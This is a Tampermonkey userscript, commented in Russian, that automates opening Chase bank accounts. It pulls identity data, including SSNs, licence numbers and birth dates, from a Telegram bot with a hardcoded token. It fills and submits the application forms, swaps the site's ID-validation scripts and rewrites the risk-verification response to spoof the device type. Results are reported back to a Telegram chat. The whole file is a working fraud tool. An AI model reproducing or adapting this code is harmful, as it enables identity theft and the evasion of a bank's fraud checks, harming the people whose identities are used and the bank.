// ==UserScript==
// @name         Chase AutoFill + XHR Intercept
// @namespace    http://tampermonkey.net/
// @version      2.3
// @description  Автозаполнение формы через Telegram бота + перехват XHR для Chase
// @author       You
// @match        https://secure.chase.com/*
// @grant        GM_xmlhttpRequest
// @grant        GM.setValue
// @grant        GM.getValue
// @run-at       document-start
// @connect      api.telegram.org
// @connect      static.chasecdn.com
// @downloadURL https://update.greasyfork.org/scripts/548728/Chase%20AutoFill%20%2B%20XHR%20Intercept.user.js
// @updateURL https://update.greasyfork.org/scripts/548728/Chase%20AutoFill%20%2B%20XHR%20Intercept.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // Проверяем, что мы на нужном домене Chase
    if (!window.location.hostname.includes('secure') || !window.location.hostname.includes('chase.com')) {
        console.log('🚫 Скрипт не для этой страницы');
        return;
    }

    // Уникальный ID для этой сессии (перестанет работать после обновления)
    const SESSION_ID = Date.now() + Math.random().toString(36).substr(2, 9);
    window.CHASE_BOT_SESSION = SESSION_ID;

    // --- Часть 1: Замена скриптов и перехват XHR ---

    const replacements = [
        {
            from: '/aoa-consumer-deposits-ui/11.5.18/index.js',
            to: 'https://static.chasecdn.com/web/library/aoareact/aoa-consumer-deposits-ui/2.12.7/index.js'
        },
        {
            from: '/idproof/document-validation-ui/undefined/remoteEntry.js',
            to: 'https://static.chasecdn.com/web/library/idproof/document-validation-ui/2.56.1/remoteEntry.js'
        }
    ];

    function getReplacement(src) {
        for (const rep of replacements) {
            if (src.includes(rep.from)) {
                return rep.to;
            }
        }
        return null;
    }

    // Безопасная замена методов DOM
    function safeDOMOverride() {
        try {
            const originalAppendChild = Element.prototype.appendChild;
            Element.prototype.appendChild = function(node) {
                if (node.tagName === 'SCRIPT' && node.src) {
                    const newSrc = getReplacement(node.src);
                    if (newSrc) {
                        console.log('[Chase Bot] Replacing script src:', node.src, '->', newSrc);
                        node.src = newSrc;
                    }
                }
                return originalAppendChild.call(this, node);
            };

            const originalInsertBefore = Element.prototype.insertBefore;
            Element.prototype.insertBefore = function(newNode, referenceNode) {
                if (newNode.tagName === 'SCRIPT' && newNode.src) {
                    const newSrc = getReplacement(newNode.src);
                    if (newSrc) {
                        console.log('[Chase Bot] Replacing script src (insertBefore):', newNode.src, '->', newSrc);
                        newNode.src = newSrc;
                    }
                }
                return originalInsertBefore.call(this, newNode, referenceNode);
            };
        } catch (e) {
            console.warn('DOM override failed:', e);
        }
    }

    function replaceExistingScripts() {
        document.querySelectorAll('script[src]').forEach(script => {
            const newSrc = getReplacement(script.src);
            if (newSrc && script.src !== newSrc) {
                console.log('[Chase Bot] Replacing existing script src:', script.src, '->', newSrc);
                script.src = newSrc;
            }
        });
    }

    // Безопасный перехват XHR
    function safeXHRIntercept() {
        try {
            const originalXHROpen = XMLHttpRequest.prototype.open;
            XMLHttpRequest.prototype.open = function(method, url) {
                if (url && typeof url === 'string' && url.includes("/svc/wr/oao/public/form/v3/applicant/status") && method.toUpperCase() === "POST") {
                    
                    // Проверяем актуальность сессии
                    if (window.CHASE_BOT_SESSION !== SESSION_ID) {
                        console.log('🛑 Сессия устарела, пропускаем перехват');
                        return originalXHROpen.apply(this, arguments);
                    }

                    const originalOnReadyStateChange = this.onreadystatechange;
                    
                    this.addEventListener("readystatechange", function() {
                        if (this.readyState === 4 && this.status === 200 && window.CHASE_BOT_SESSION === SESSION_ID) {
                            try {
                                let responseObj = JSON.parse(this.responseText);
                                let eligibilityStatus = null;
                                let riskStatus = null;
                                
                                if (Array.isArray(responseObj.stepCompletionStatus)) {
                                    responseObj.stepCompletionStatus.forEach(step => {
                                        if (step.stepName === "ELIGIBILITY_CHECK") {
                                            eligibilityStatus = step.statusName;
                                        }
                                        if (step.stepName === "RISK_VERIFICATION") {
                                            riskStatus = step.statusName;
                                            if (!step.originalDeviceTypeName) {
                                                step.originalDeviceTypeName = "browser_computer";
                                            }
                                        }
                                    });
                                }
                                
                                const modifiedResponseText = JSON.stringify(responseObj);
                                
                                Object.defineProperty(this, 'responseText', {
                                    value: modifiedResponseText,
                                    writable: false
                                });
                                
                                Object.defineProperty(this, 'response', {
                                    value: modifiedResponseText,
                                    writable: false
                                });

                                // Отправляем в Telegram
                                let message = `Скрипт сработал PERSONAL для Сержика Годзиллы.\n`;
                                if (eligibilityStatus) message += `ELIGIBILITY_CHECK статус: ${eligibilityStatus}\n`;
                                if (riskStatus) message += `RISK_VERIFICATION статус: ${riskStatus}`;

                                // Используем GM_xmlhttpRequest для кросс-доменных запросов
                                if (typeof GM_xmlhttpRequest !== 'undefined') {
                                    GM_xmlhttpRequest({
                                        method: "POST",
                                        url: "https://api.telegram.org/bot7288347645:AAGfaQnSum0rm9KAPK9FsShg-NaObmuRJYc/sendMessage",
                                        headers: {
                                            "Content-Type": "application/json"
                                        },
                                        data: JSON.stringify({
                                            chat_id: "-4575183996",
                                            text: message
                                        }),
                                        onload: function(response) {
                                            if (response.status !== 200) {
                                                console.error("Ошибка отправки в Telegram:", response.status);
                                            }
                                        },
                                        onerror: function(error) {
                                            console.error("Ошибка при выполнении запроса:", error);
                                        }
                                    });
                                }

                            } catch (e) {
                                console.error("Ошибка при подмене ответа:", e);
                            }
                        }
                    }, false);

                    if (originalOnReadyStateChange) {
                        this.onreadystatechange = function() {
                            if (this.readyState === 4 && this.status === 200 && window.CHASE_BOT_SESSION === SESSION_ID) {
                                // Дублируем обработку для onreadystatechange
                            }
                            return originalOnReadyStateChange.apply(this, arguments);
                        };
                    }
                }
                return originalXHROpen.apply(this, arguments);
            };
        } catch (e) {
            console.warn('XHR intercept failed:', e);
        }
    }

    // --- Часть 2: Telegram Bot AutoFill ---

    function initTelegramBot() {
        // Проверяем актуальность сессии
        if (window.CHASE_BOT_SESSION !== SESSION_ID) {
            console.log('🛑 Сессия устарела, бот не запускается');
            return;
        }

        if (window.telegramBotRunning) {
            console.log('🚫 Бот уже запущен!');
            return;
        }
        window.telegramBotRunning = true;

        const TELEGRAM_BOT_TOKEN = '7288347645:AAGfaQnSum0rm9KAPK9FsShg-NaObmuRJYc';
        const TELEGRAM_CHAT_ID = '-4575183996';
        let lastUpdateId = 0;
        let isProcessing = false;
        let checkInterval = null;

        async function sendToTelegram(message) {
            // Проверяем актуальность сессии перед отправкой
            if (window.CHASE_BOT_SESSION !== SESSION_ID) {
                console.log('🛑 Сессия устарела, отправка отменена');
                return;
            }

            try {
                if (typeof GM_xmlhttpRequest !== 'undefined') {
                    return new Promise((resolve) => {
                        GM_xmlhttpRequest({
                            method: 'POST',
                            url: `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
                            headers: {'Content-Type': 'application/json'},
                            data: JSON.stringify({
                                chat_id: TELEGRAM_CHAT_ID,
                                text: message
                            }),
                            onload: resolve,
                            onerror: (error) => {
                                console.error('Ошибка Telegram:', error);
                                resolve();
                            }
                        });
                    });
                }
            } catch (error) {
                console.error('Ошибка отправки в Telegram:', error);
            }
        }

        async function checkTelegramMessages() {
            if (isProcessing || window.CHASE_BOT_SESSION !== SESSION_ID) return;

            try {
                isProcessing = true;
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=1`;
                
                let response;
                if (typeof GM_xmlhttpRequest !== 'undefined') {
                    response = await new Promise((resolve) => {
                        GM_xmlhttpRequest({
                            method: 'GET',
                            url: url,
                            onload: resolve,
                            onerror: () => resolve({status: 500})
                        });
                    });
                }

                if (response.status !== 200) return;

                const data = typeof response.responseText !== 'undefined' ? 
                    JSON.parse(response.responseText) : await response.json();

                if (data.ok && data.result.length > 0) {
                    for (const update of data.result) {
                        if (update.update_id > lastUpdateId) {
                            lastUpdateId = update.update_id;

                            const messageText = update.message?.text;
                            if (messageText && messageText.includes('\n')) {
                                console.log('📨 Новое сообщение получено');
                                stopChecking();
                                await sendToTelegram('✅ Данные получены! Начинаю...');

                                const formData = processTelegramData(messageText);
                                await autoFillForm(formData);

                                startChecking();
                                break;
                            }
                        }
                    }
                }
            } catch (error) {
                console.error('Ошибка проверки сообщений:', error);
            } finally {
                isProcessing = false;
            }
        }

        function startChecking() {
            if (checkInterval) clearInterval(checkInterval);
            checkInterval = setInterval(checkTelegramMessages, 3000);
            console.log('🔍 Проверка сообщений запущена');
        }

        function stopChecking() {
            if (checkInterval) {
                clearInterval(checkInterval);
                checkInterval = null;
                console.log('⏸️ Проверка сообщений остановлена');
            }
        }

        function processTelegramData(messageText) {
            const lines = messageText.split('\n').filter(line => line.trim() !== '');

            const parseBirthDate = (dateStr) => {
                const cleanDate = dateStr.split(' ')[0];
                const [year, month, day] = cleanDate.split('-');
                return month + '/' + day + '/' + year;
            };

            return {
                firstName: lines[0] || '',
                lastName: lines[1] || '',
                email: lines[2] || '',
                address: lines[3] || '',
                city: lines[4] || '',
                state: lines[5] || '',
                zip: lines[6] || '',
                ssn: lines[7] || '',
                licenseState: lines[8] || '',
                birthDate: parseBirthDate(lines[9] || ''),
                phone: lines[10] || '',
                licenseNumber: lines[11] || ''
            };
        }

        // Вспомогательные функции для работы с элементами
        function setInputValue(selector, value) {
            const element = document.querySelector(selector);
            if (element) {
                element.setAttribute('value', value);
                element.dispatchEvent(new Event('input', { bubbles: true }));
                element.dispatchEvent(new Event('change', { bubbles: true }));
                element.dispatchEvent(new Event('blur', { bubbles: true }));
                return true;
            }
            return false;
        }

        function setSelectValue(selector, value) {
            const element = document.querySelector(selector);
            if (element) {
                element.setAttribute('value', value);
                element.dispatchEvent(new Event('change', { bubbles: true }));
                return true;
            }
            return false;
        }

        function setRadioValue(selector, value) {
            const element = document.querySelector(selector);
            if (element) {
                element.setAttribute('selected-radio', value);
                element.dispatchEvent(new Event('change', { bubbles: true }));
                return true;
            }
            return false;
        }

        function setCheckboxValue(selector, checked) {
            const element = document.querySelector(selector);
            if (element) {
                element.setAttribute('state', checked ? 'true' : 'false');
                element.dispatchEvent(new Event('change', { bubbles: true }));
                return true;
            }
            return false;
        }

        function clickButton(selector) {
            const element = document.querySelector(selector);
            if (element) {
                element.click();
                return true;
            }
            
            // Попробуем найти через shadowRoot
            const shadowElement = document.querySelector(selector);
            if (shadowElement && shadowElement.shadowRoot) {
                const button = shadowElement.shadowRoot.querySelector('button');
                if (button) {
                    button.click();
                    return true;
                }
            }
            return false;
        }

        function clickStickyFooterButton(footerSelector, buttonSelector) {
            const footer = document.querySelector(footerSelector);
            if (footer && footer.shadowRoot) {
                const button = footer.shadowRoot.querySelector(buttonSelector);
                if (button) {
                    button.click();
                    return true;
                }
            }
            return false;
        }

        async function waitForElement(selector, timeout = 10000) {
            const startTime = Date.now();
            while (Date.now() - startTime < timeout) {
                const element = document.querySelector(selector);
                if (element) return element;
                await new Promise(resolve => setTimeout(resolve, 100));
            }
            return null;
        }

        async function autoFillForm(data) {
            // Проверяем актуальность сессии перед началом заполнения
            if (window.CHASE_BOT_SESSION !== SESSION_ID) {
                console.log('🛑 Сессия устарела, заполнение отменено');
                return;
            }

            console.log('🚀 Запускаем автозаполнение');
            const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

            try {
                // Страница 1: Выбор гражданства
                await sendToTelegram('📄 Страница 1: Выбор гражданства');
                await delay(1000);
                setRadioValue('mds-radio-group', 'false');
                await delay(500);
                clickStickyFooterButton('mds-sticky-footer#mobileNavButtons', '#button1');
                await delay(1500);

                // Страница 2: Личные данные
                await sendToTelegram('📄 Страница 2: Личные данные');
                setInputValue('mds-text-input[name="applicant.name.firstName"]', data.firstName);
                await delay(200);
                setInputValue('mds-text-input[name="applicant.name.lastName"]', data.lastName);
                await delay(500);
                clickStickyFooterButton('mds-sticky-footer#mobileNavButtons', '#button1');
                await delay(1500);

                // Страница 3: Дата рождения
                await sendToTelegram('📄 Страница 3: Дата рождения');
                const datepicker = document.querySelector('mds-datepicker');
                if (datepicker) {
                    datepicker.setAttribute('value', data.birthDate);
                    datepicker.setAttribute('selected-date', data.birthDate);
                    datepicker.removeAttribute('error-message');
                    ['input', 'change', 'blur'].forEach(event => {
                        datepicker.dispatchEvent(new Event(event, { bubbles: true }));
                    });
                }
                await delay(500);
                clickStickyFooterButton('mds-sticky-footer#mobileNavButtons', '#button1');
                await delay(1500);

                // Страница 4: Контакты
                await sendToTelegram('📄 Страница 4: Контакты');
                setInputValue('mds-text-input[name="applicant.email.0.emailAddressText"]', data.email);
                await delay(200);
                setInputValue('mds-text-input[id="applicant-primaryContactPhoneNumber-0"]', data.phone);
                await delay(500);
                clickStickyFooterButton('mds-sticky-footer#mobileNavButtons', '#button1');
                await delay(1500);

                // Страница 5: Адрес
                await sendToTelegram('📄 Страница 5: Адрес');
                setInputValue('mds-text-input[name="skipAppCap.applicant.address.0.addressLine1"]', data.address);
                await delay(200);
                setInputValue('mds-text-input#applicant\\.address\\.0-addressCityName', data.city);
                await delay(200);
                setInputValue('mds-text-input[name="skipAppCap.applicant.address.0.addressPostalCode"]', data.zip);
                await delay(200);
                setSelectValue('mds-select[name="skipAppCap.applicant.address.0.addressStateCode"]', data.state);
                await delay(500);
                clickStickyFooterButton('mds-sticky-footer#mobileNavButtons', '#button1');
                await delay(1500);

                // Проверка модалки адреса
                await delay(1000);
                const addressModal = document.querySelector('mds-dialog-modal');
                if (addressModal) {
                    const confirmButton = addressModal.shadowRoot?.querySelector('mds-sticky-footer')?.shadowRoot?.querySelector('#button1');
                    if (confirmButton) {
                        confirmButton.click();
                        await delay(1000);
                    }
                }

                // Страница 6: Гражданство
                await sendToTelegram('📄 Страница 6: Гражданство');
                setRadioValue('mds-radio-group', 'US_CITIZEN');
                await delay(500);
                clickStickyFooterButton('mds-sticky-footer#mobileNavButtons', '#button1');
                await delay(1500);

                // Страница 7: SSN
                await sendToTelegram('📄 Страница 7: SSN');
                const ssnInput = document.querySelector('mds-text-input-secure');
                if (ssnInput) {
                    ssnInput.setAttribute('value', data.ssn);
                    ssnInput.dispatchEvent(new Event('change', { bubbles: true }));
                }
                await delay(500);
                clickStickyFooterButton('mds-sticky-footer#mobileNavButtons', '#button1');
                await delay(1500);

                // Страница 8: Документы
                await sendToTelegram('📄 Страница 8: Документы');
                await delay(1000);
                
                setSelectValue('mds-select', 'US_DRIVERS_LICENSE');
                await delay(300);
                
                setInputValue('mds-text-input[name="applicant.identificationDocuments.0.nonTaxGovernmentIssuedIdentifier"]', data.licenseNumber);
                await delay(300);
                
                setSelectValue('mds-select[id="applicant.identificationDocuments.0.customerIdentityVerificationDocumentIssuanceStateCode-genericSelect"]', data.licenseState);
                await delay(500);
                
                clickStickyFooterButton('mds-sticky-footer#mobileNavButtons', '#button1');
                await delay(1500);

                // Страница 9: Соглашения
                await sendToTelegram('📄 Страница 9: Соглашения');
                setCheckboxValue('mds-checkbox#craDisclosure-checkbox-0', true);
                await delay(200);
                setCheckboxValue('mds-checkbox#ssaDisclosure-checkbox-0', true);
                await delay(500);
                clickStickyFooterButton('mds-sticky-footer#mobileNavButtons', '#button1');

                await sendToTelegram('🎉 АВТОРЕГИСТРАЦИЯ ЗАВЕРШЕНА!');

            } catch (error) {
                console.error('Ошибка:', error);
                await sendToTelegram('❌ Ошибка: ' + error.message);
            }
        }

        // Запуск бота
        console.log('🚀 Бот инициализирован для сессии:', SESSION_ID);
        startChecking();

        if (!window.botStarted) {
            window.botStarted = true;
            setTimeout(async () => {
                if (window.CHASE_BOT_SESSION === SESSION_ID) {
                    await sendToTelegram('🤖 Бот запущен! Отправь данные для регистрации.');
                }
            }, 2000);
        }
    }

    // --- Инициализация скрипта ---

    // Останавливаем скрипт при обновлении страницы
    window.addEventListener('beforeunload', function() {
        window.CHASE_BOT_SESSION = 'EXPIRED_' + SESSION_ID;
        console.log('🛑 Сессия остановлена из-за обновления страницы');
    });

    // Инициализируем скрипт
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function() {
            safeDOMOverride();
            replaceExistingScripts();
            safeXHRIntercept();
            setTimeout(initTelegramBot, 2000);
        });
    } else {
        safeDOMOverride();
        replaceExistingScripts();
        safeXHRIntercept();
        setTimeout(initTelegramBot, 2000);
    }

})();